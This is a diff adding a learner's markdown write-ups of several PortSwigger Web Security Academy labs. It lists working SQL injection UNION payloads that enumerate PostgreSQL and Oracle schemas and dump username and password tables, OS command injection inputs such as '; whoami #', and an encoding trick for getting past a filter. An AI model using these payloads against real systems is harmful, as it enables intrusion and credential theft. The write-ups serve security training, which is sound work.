@@ -1,0 +1,94 @@
+# PortSwigger lab writeups
+Wow! I can do things now!
+
+### [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
+Level: Practitioner\
+Resources used: [PortSwigger "Determining the number of columns required"](https://portswigger.net/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required), ["Listing the contents of the database"](https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database)\
+Date completed: 2026-05-12
+
+In this lab, you exploit an SQLi vulnerability in the product category filter of a PostgreSQL database. You use UNION attacks to learn the names of tables and columns, and then you use a final UNION attack to get all usernames and passwords.
+
+---
+
+First, find out that you need to have two columns, both strings.
+- `Accessories' ORDER BY 2--` works, but `Accessories' ORDER BY 3--` doesn't, so there must be two columns.
+- `Accessories' UNION SELECT 'a','a'--` works, so the columns can be strings.
+
+Next, reference "Listing the contents of the database" documentation to learn `information_schema.tables` gives you columns named TABLE_NAME and TABLE_TYPE (among others), which seem helpful.
+- `Accessories' UNION SELECT TABLE_NAME, TABLE_TYPE FROM information_schema.tables--` gives you the names and types of tables.
+- Ctrl + F for "user" and we get lots of VIEW tables and one BASE TABLE: users_uqhmky.
+
+We want to see the column names from that users table. Documentation indicates that when you select from `information_schema.columns`, you get fields named TABLE_NAME, COLUMN_NAME, and DATA_TYPE (among others). I want COLUMN_NAME for all rows where TABLE_NAME is users_uqhmky.
+- `Accessories' UNION SELECT COLUMN_NAME,DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME='users_uqhmky'--`
+- This gives two COLUMN_NAME values, namely username_zzokdr and password_xqgpuc. These are the names of the username and password fields in the users table.
+
+Finally, show the values of the username and password fields within the users_uqhmky table:
+- `Accessories' UNION SELECT username_zzokdr,password_xqgpuc FROM users_uqhmky--`
+- This gives all usernames and passwords, and by all I mean just the admin account. 
+
+Yay!!!!
+
+### [OS command injection, simple case](https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/os-command-injection-apprentice/os-command-injection/lab-simple)
+Level: Apprentice \
+Resources used: My brain \
+Date completed: 2026-05-19
+
+The query to the backend looks like `productId=1&storeId=2`. Here's what I injected into productId:
+- `& echo hello &` --> "Missing parameter: product ID". This came from the PortSwigger course, but it didn't immediately work.
+- `; echo hello` --> "hello 2" (win, it's executing)
+- `; echo hello#` --> "sh: 1: whoami#: not found"
+- `; echo hello #` --> "hello"
+- `; whoami #` --> "peter-tBG6Pm"
+
+### [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
+Level: Practitioner\
+Resources used: [Get list of all tables in Oracle?](https://stackoverflow.com/a/205746), [ALL_TABLES documentation](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html), [ALL_TAB_COLUMNS documentation](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html)\
+Date completed: 2026-05-20
+
+First, find out that you need two columns, both stringable. The steps from "SQL injection attack, listing the database contents on non-Oracle databases" apply.
+
+In Repeater > Inspector > Request query parameters, I injected these values into `category` to solve the lab:
+1. `Gifts' UNION SELECT owner, table_name FROM all_tables--` --> There's a table named USERS_YHXQYZ
+    - [`all_tables` contains columns "owner" and "table_name"](https://stackoverflow.com/a/205746)
+2. `Gifts' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'USERS_YHXQYZ'--` --> USERS_YHXQYZ contains columns USERNAME_ROGXSJ and PASSWORD_IYLBJJ
+    - [ALL_TAB_COLUMNS contains columns "column_name" and "data_type"](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html)
+3. `Gifts' UNION SELECT USERNAME_ROGXSJ, PASSWORD_IYLBJJ FROM USERS_YHXQYZ--` --> Shows all usernames and passwords
+
+### [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
+Level: Practitioner\
+Resources: [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)\
+Date completed: 2026-05-20
+
+This is what I injected into the product category field:
+1. `Gifts' ORDER BY 2--` yields 200 OK, but `ORDER BY 3` yields 500 Internal Server Error, so there must be two fields.
+2. `Gifts' UNION SELECT NULL, NULL --` --> 200 OK. An Oracle database would've complained about the lack of a specified database to SELECT from, so this is not an Oracle database.
+2. `Gifts' UNION SELECT 'a','a' --` --> 500 Internal Server Error, so one of the fields is not stringable.
+3. `Gifts' UNION SELECT NULL,'a' --` --> 200 OK. So only the second field is stringable.
+4. `Gifts' UNION SELECT NULL,version()--` --> "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit". Probably not necessary, but it satisfied my curiosity.
+5. `Gifts' UNION SELECT NULL,TABLE_NAME||TABLE_TYPE FROM information_schema.tables--` --> Shows a list of tables, including 'users'.
+6. Find names of columns of 'users' table: `Gifts' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users'--` --> users table has columns email, password, username.
+    - Apparently 'users' is not the same as 'USERS'. TIL.
+7. Dump 'users' table: `Gifts' UNION SELECT NULL,username||password FROM users--` --> Shows all usernames and passwords.
+
+### [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
+Level: Practitioner\
+Resources: [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database)\
+Date completed: 2026-05-20
+
+Much the same: 
+1. `Pets' ORDER BY 3--`
+2. `Pets' ORDER BY 2--`
+3. `Pets' UNION SELECT 'a','a' FROM information_schema.tables --`
+4. `Pets' UNION SELECT table_name, table_type FROM information_schema.tables --`
+5. `Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --`
+6. `Pets' UNION SELECT username,password FROM users--`
+
+### [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+Level: Practitioner\
+Date completed: 2026-05-20
+
+Download Hackvertor extension through Burp: Extensions > BApp Store > Search for Hackvertor > Install. Then you can highlight the storeId value (just a 1 in my case) and obfuscate it by right clicking and going to Extensions > Hackvertor > Encode > hex_entities.
+
+Here's what I injected, obfuscated via Hackvertor:
+1. `2 UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--` --> Shows the fields email, password, and username.
+2. `2 UNION SELECT username || password FROM users--` --> Shows all usernames and passwords.
